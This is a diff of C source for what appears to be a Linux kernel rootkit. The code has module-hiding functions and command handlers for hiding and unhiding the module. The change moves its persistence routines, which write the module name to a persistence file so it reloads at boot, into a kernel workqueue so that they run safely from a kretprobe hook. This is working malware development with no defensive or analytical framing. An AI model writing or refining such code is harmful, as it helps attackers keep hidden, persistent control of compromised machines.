@@ -5,6 +5,7 @@
 #include <linux/list.h>
 #include <linux/module.h>
 #include <linux/spinlock.h>
+#include <linux/workqueue.h>
 
 /* Module hiding */
 
@@ -48,38 +49,40 @@ bool rk_module_hidden(void)
 	return hidden;
 }
 
-/* Persistence */
+/*
+ * Persistence - deferred to workqueue because filp_open/kernel_write
+ * sleep, and command handlers run from kretprobe entry (atomic context).
+ */
 
-static int rk_persist(void)
+static void do_persist(struct work_struct *w)
 {
 	struct file *f;
 	loff_t pos = 0;
 
 	f = filp_open(PERSIST_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644);
 	if (IS_ERR(f))
-		return PTR_ERR(f);
+		return;
 	kernel_write(f, MODULE_NAME_STR "\n", sizeof(MODULE_NAME_STR), &pos);
 	filp_close(f, NULL);
-	return 0;
 }
 
-static int rk_unpersist(void)
+static void do_unpersist(struct work_struct *w)
 {
 	struct file *f;
-	loff_t pos = 0;
 
 	f = filp_open(PERSIST_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644);
 	if (IS_ERR(f))
-		return PTR_ERR(f);
-	kernel_write(f, "", 0, &pos);
+		return;
 	filp_close(f, NULL);
-	return 0;
 }
+
+static DECLARE_WORK(persist_work, do_persist);
+static DECLARE_WORK(unpersist_work, do_unpersist);
 
 /* Command handlers */
 
-static int cmd_persist(const char *arg) { return rk_persist(); }
-static int cmd_unpersist(const char *arg) { return rk_unpersist(); }
+static int cmd_persist(const char *arg) { schedule_work(&persist_work); return 0; }
+static int cmd_unpersist(const char *arg) { schedule_work(&unpersist_work); return 0; }
 static int cmd_hide_module(const char *arg) { rk_module_hide(); return 0; }
 static int cmd_unhide_module(const char *arg) { rk_module_unhide(); return 0; }
 
